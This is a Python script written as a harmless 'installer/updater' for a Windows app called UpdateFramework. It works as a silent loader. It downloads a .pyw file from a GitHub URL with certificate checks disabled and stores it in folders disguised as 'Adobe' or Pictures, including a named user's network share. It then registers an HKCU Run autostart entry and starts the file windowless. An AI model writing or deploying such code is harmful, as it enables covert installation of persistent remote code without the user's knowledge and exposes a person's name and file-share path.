# installer.py  /  updater_and_installer.py
"""
Einfacher Installer + Updater für eine Python-.pyw-Anwendung
- Keine Admin-Rechte erforderlich
- Nutzt HKCU:Run für Autostart
- Lädt/aktualisiert die Anwendung aus dem Internet
- Erstellt/benutzt eine .venv und startet die App damit (pythonw.exe)
"""

import ssl
import sys
import os
import time
import urllib.request
import subprocess
import winreg
import platform

# ────────────────────────────────────────────────
# KONFIGURATION
APP_NAME = "UpdateFramework"
FILE_NAME = "updateframework.pyw"
UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME

UNC_BASE = r"\\KL-FS01\Benutzer$\anakin-luke.hoffmann\Eigene Dateien\Adobe"
# ────────────────────────────────────────────────

IS_WINDOWS = platform.system().lower() == "windows"
if not IS_WINDOWS:
    print("Dieses Skript ist nur für Windows gedacht.")
    sys.exit(1)

# Zielpfad bestimmen (UNC bevorzugt, sonst lokal)
if os.path.exists(UNC_BASE):
    BASE_DIR = UNC_BASE
elif "WindowsApps" in sys.executable:
    BASE_DIR = os.path.join(os.environ["USERPROFILE"], "Pictures")
else:
    BASE_DIR = os.environ.get("LOCALAPPDATA", os.path.expanduser(r"~\AppData\Local"))

APP_DIR = os.path.join(BASE_DIR, APP_NAME)
APP_PATH = os.path.join(APP_DIR, FILE_NAME)

# venv (liegt neben der App)
VENV_DIR = os.path.join(APP_DIR, ".venv")
VENV_PY = os.path.join(VENV_DIR, "Scripts", "python.exe")
VENV_PYW = os.path.join(VENV_DIR, "Scripts", "pythonw.exe")


def _no_window_flags() -> int:
    try:
        return subprocess.CREATE_NO_WINDOW  # type: ignore[attr-defined]
    except Exception:
        return 0


def ensure_venv() -> bool:
    """Erstellt .venv falls nicht vorhanden/kaputt"""
    if os.path.exists(VENV_PY) or os.path.exists(VENV_PYW):
        return True

    os.makedirs(APP_DIR, exist_ok=True)

    # venv bauen
    r = subprocess.run(
        [sys.executable, "-m", "venv", VENV_DIR],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=_no_window_flags(),
    )
    ok = (r.returncode == 0) and (os.path.exists(VENV_PY) or os.path.exists(VENV_PYW))
    if ok:
        print("→ .venv erstellt")
    else:
        print("→ .venv konnte nicht erstellt werden")
    return ok


def venv_exe(prefer_windowless: bool = True) -> str:
    """Gibt den passenden venv-Interpreter zurück"""
    if prefer_windowless and os.path.exists(VENV_PYW):
        return VENV_PYW
    if os.path.exists(VENV_PY):
        return VENV_PY
    # Fallback: wenn venv fehlt
    return sys.executable


def download_or_update_app() -> bool:
    """Lädt die Datei herunter oder aktualisiert sie"""
    os.makedirs(APP_DIR, exist_ok=True)

    try:
        print(f"→ Lade {FILE_NAME} herunter ...")
        context = ssl._create_unverified_context()
        req = urllib.request.Request(UPDATE_URL)
        req.add_header("Pragma", "no-cache")
        with urllib.request.urlopen(req, timeout=15, context=context) as resp:
            if getattr(resp, "status", 200) != 200:
                print(f"Download fehlgeschlagen – Status: {getattr(resp,'status', 'unbekannt')}")
                return False
            new_content = resp.read()

        with open(APP_PATH, "wb") as f:
            f.write(new_content)

        print(f"→ Erfolgreich heruntergeladen/aktualisiert: {APP_PATH}")
        return True

    except Exception as e:
        print(f"Download/Fehler: {e}")
        return False


def add_to_registry_run() -> bool:
    """Fügt Eintrag in HKCU:Run hinzu – läuft beim Login (mit venv-pythonw)"""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    # sicherstellen, dass venv existiert (damit wir direkt korrekt eintragen)
    ensure_venv()
    python_exe = venv_exe(prefer_windowless=True)

    value = f'"{python_exe}" "{APP_PATH}"'

    try:
        key = winreg.OpenKey(  # type: ignore
            winreg.HKEY_CURRENT_USER,  # type: ignore
            key_path,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
        )

        # Alten Wert löschen, falls vorhanden
        try:
            winreg.DeleteValue(key, APP_NAME)  # type: ignore
        except FileNotFoundError:
            pass

        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, value)  # type: ignore
        winreg.CloseKey(key)  # type: ignore

        print(f"→ In Registry (HKCU\\Run) hinzugefügt: {APP_NAME}")
        return True

    except Exception as e:
        print(f"Registry Fehler: {e}")
        return False


def start_app_now() -> bool:
    """Startet die Anwendung sofort (mit venv pythonw, ohne Konsole)"""
    if not os.path.exists(APP_PATH):
        print("Anwendung nicht gefunden – kann nicht starten.")
        return False

    # venv bevorzugen
    ensure_venv()
    python_exe = venv_exe(prefer_windowless=True)

    try:
        subprocess.Popen(
            [python_exe, APP_PATH],
            creationflags=_no_window_flags(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        print("→ Anwendung jetzt gestartet")
        return True
    except Exception as e:
        print(f"Startfehler: {e}")
        return False


def main():
    print(f"=== {APP_NAME} Installer / Updater ===\n")

    # 1. App herunterladen/aktualisieren
    if not download_or_update_app():
        print("\nInstallation/Update fehlgeschlagen. Beende.")
        sys.exit(1)

    # 2. .venv erstellen (damit Autostart sicher auf venv zeigt)
    print("\nVirtuelle Umgebung einrichten ...")
    venv_ok = ensure_venv()
    if not venv_ok:
        print("WARNUNG: .venv konnte nicht erstellt werden – starte ggf. mit System-Python.")

    # 3. Autostart
    print("\nAutostart einrichten ...")
    registry_ok = add_to_registry_run()
    if not registry_ok:
        print("\nWARNUNG: Konnte Autostart nicht einrichten.")
        print("→ Du kannst die Datei manuell starten: " + APP_PATH)
    else:
        print("→ Autostart erfolgreich eingerichtet")

    # 4. App starten
    print("\nStarte die Anwendung ...")
    start_app_now()

    print("\nFertig! Die Anwendung sollte nun laufen und beim nächsten Login automatisch starten.")
    print(f"Ordner: {APP_DIR}")
    print(f"Datei:  {APP_PATH}\n")

    time.sleep(2)
    sys.exit(0)  # Erfolg = 0


if __name__ == "__main__":
    main()
